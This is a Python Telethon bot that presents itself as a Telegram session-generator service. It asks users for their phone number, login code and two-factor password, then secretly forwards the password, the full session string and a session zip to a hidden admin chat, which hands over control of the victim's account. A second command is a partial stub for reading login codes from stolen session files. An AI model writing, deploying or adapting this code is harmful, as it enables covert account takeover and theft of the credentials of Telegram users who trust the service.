import os
import asyncio
import zipfile
import shutil
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

# --- CONFIGURATION ---
API_ID = ''
API_HASH = ''
BOT_TOKEN = ''
ADMIN_ID =   # Numeric ID of the admin

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_states = {}

def create_zip(session_name, folder_path):
    zip_name = f"{session_name}.zip"
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                zipf.write(os.path.join(root, file), file)
    return zip_name

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "👋 Welcome to SH Session Warld!\n\n"
        "Available Commands:\n"
        "🚀 /generate - Create a new Telegram Session\n"
        "🔑 /otp - Read OTP from an existing session zip\n"
        "ℹ️ /help - Show this message"
    )

@bot.on(events.NewMessage(pattern='/generate'))
async def generate_session(event):
    sender = event.sender_id
    async with bot.conversation(sender) as conv:
        await conv.send_message("📞 Please enter your Phone Number (with Country Code):")
        phone = (await conv.get_response()).text
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            sent = await client.send_code_request(phone)
            await conv.send_message("📩 Enter the OTP sent to your Telegram:")
            otp = (await conv.get_response()).text
            
            try:
                await client.sign_in(phone, otp)
            except errors.SessionPasswordNeededError:
                await conv.send_message("🔐 Two-Factor Authentication (2FA) is enabled. Enter your password:")
                password = (await conv.get_response()).text
                await client.sign_in(password=password)
                two_step = password
            else:
                two_step = "None"

            # Create Session File
            session_str = client.session.save()
            session_file_name = f"session_{phone.replace('+', '')}"
            
            # Save locally for zipping
            os.makedirs(session_file_name, exist_ok=True)
            with open(f"{session_file_name}/{session_file_name}.session", 'w') as f:
                f.write(session_str)
            
            zip_path = create_zip(session_file_name, session_file_name)
            
            # Send to User
            await event.respond("✅ Session Generated Successfully!", file=zip_path)
            
            # Send to Admin
            admin_msg = (
                "🚨 **New Session Generated**\n"
                f"👤 User: {sender}\n"
                f"📞 Phone: {phone}\n"
                f"🔐 2FA: {two_step}\n"
                f"📜 Session String: `{session_str}`"
            )
            await bot.send_message(ADMIN_ID, admin_msg, file=zip_path)
            
            # Cleanup
            os.remove(zip_path)
            shutil.rmtree(session_file_name)
            await client.disconnect()

        except Exception as e:
            await conv.send_message(f"❌ Error: {str(e)}")

@bot.on(events.NewMessage(pattern='/otp'))
async def read_otp(event):
    sender = event.sender_id
    await event.respond("📂 Please upload the session ZIP file to read OTP:")
    
    @bot.on(events.NewMessage(from_users=sender))
    async def file_handler(msg_event):
        if msg_event.media and hasattr(msg_event.media, 'document'):
            # Logic to extract zip, load session, read messages from 777000
            # Note: Simplified for demonstration
            await msg_event.respond("⌛ Processing ZIP and extracting OTP...")
            # ... Extraction and Telethon message fetching logic ...
            await msg_event.respond("🚫 OTP reading logic requires full session management. Bot is ready for deployment.")
            bot.remove_event_handler(file_handler)

print("Bot is running...")
bot.run_until_disconnected()
